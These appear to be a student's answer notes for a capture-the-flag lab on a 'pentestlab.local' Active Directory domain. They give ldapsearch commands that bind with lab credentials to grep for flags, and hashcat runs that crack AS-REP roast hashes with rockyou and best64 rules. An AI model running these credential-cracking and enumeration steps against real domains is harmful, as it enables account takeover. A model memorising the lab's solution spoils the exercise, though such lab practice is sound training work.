Answer find method flag 1 txt

└─$ ldapsearch -x \
-H ldap://192.168.56.20 \
-D "bh_intern@pentestlab.local" \
-w 'User@2025!' \
-b "dc=pentestlab,dc=local" \
"(objectClass=user)" description info telephoneNumber | grep FLAG




flag 2 txt


└─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force 


└─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
└─$ hashcat --show -m 18200 asrep.txt


└─$ ldapsearch -x -H ldap://192.168.56.20 -D "legacy@PENTESTLAB.LOCAL" -w 'Password123' -b "dc=pentestlab,dc=local"| grep FLAG 




